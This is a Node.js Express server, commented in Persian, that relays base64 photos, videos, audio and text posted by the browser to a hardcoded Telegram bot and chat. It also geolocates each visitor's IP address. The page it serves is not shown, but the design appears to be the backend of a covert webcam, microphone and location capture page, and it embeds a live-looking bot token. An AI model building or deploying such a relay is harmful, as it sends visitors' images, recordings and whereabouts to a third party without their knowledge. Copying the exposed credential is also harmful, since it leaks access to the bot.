import express from 'express';
import fetch from 'node-fetch';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = '8401969947:AAFLWQND6J1aAHaDcZSuhhM6gkDFdinD5_8';
const CHAT_ID = '7727238041';

app.use(express.json({ limit: '50mb' }));
app.use(express.static(__dirname));

// ارسال پیام متنی
app.post('/api/send', async (req, res) => {
  const { text } = req.body;
  if (!text) return res.json({ ok: false });

  try {
    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'Markdown' })
    });
    const j = await r.json();
    res.json(j);
  } catch (e) {
    res.json({ ok: false, error: e.message });
  }
});

// ارسال عکس (با Base64)
app.post('/api/send-photo', async (req, res) => {
  const { photo } = req.body;
  if (!photo) return res.json({ ok: false });

  try {
    // تبدیل Base64 به Buffer
    const base64Data = photo.split(';base64,').pop();
    const buffer = Buffer.from(base64Data, 'base64');

    const formData = new FormData();
    const blob = new Blob([buffer], { type: 'image/jpeg' });
    formData.append('photo', blob, 'photo.jpg');
    formData.append('chat_id', CHAT_ID);

    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });
    const j = await r.json();
    res.json(j);
  } catch (e) {
    res.json({ ok: false, error: e.message });
  }
});

// ارسال فیلم (با Base64)
app.post('/api/send-video', async (req, res) => {
  const { video } = req.body;
  if (!video) return res.json({ ok: false });

  try {
    const base64Data = video.split(';base64,').pop();
    const buffer = Buffer.from(base64Data, 'base64');

    const formData = new FormData();
    const blob = new Blob([buffer], { type: 'video/mp4' });
    formData.append('video', blob, 'video.mp4');
    formData.append('chat_id', CHAT_ID);

    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
      method: 'POST',
      body: formData
    });
    const j = await r.json();
    res.json(j);
  } catch (e) {
    res.json({ ok: false, error: e.message });
  }
});

// ارسال صدا (با Base64)
app.post('/api/send-audio', async (req, res) => {
  const { audio } = req.body;
  if (!audio) return res.json({ ok: false });

  try {
    const base64Data = audio.split(';base64,').pop();
    const buffer = Buffer.from(base64Data, 'base64');

    const formData = new FormData();
    const blob = new Blob([buffer], { type: 'audio/webm' });
    formData.append('audio', blob, 'audio.webm');
    formData.append('chat_id', CHAT_ID);

    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
      method: 'POST',
      body: formData
    });
    const j = await r.json();
    res.json(j);
  } catch (e) {
    res.json({ ok: false, error: e.message });
  }
});

// دریافت IP و اطلاعات جغرافیایی
app.get('/api/geo', async (req, res) => {
  try {
    const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() ||
      req.headers['x-real-ip'] ||
      req.socket.remoteAddress || '';

    const r = await fetch(`http://ip-api.com/json/${ip}?lang=en&fields=status,country,city,query`);
    const j = await r.json();

    res.json({
      ip: j.query || ip,
      city: j.city || '',
      country: j.country || ''
    });
  } catch (e) {
    res.json({ ip: 'خطا', city: '', country: '' });
  }
});

// صفحه اصلی
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});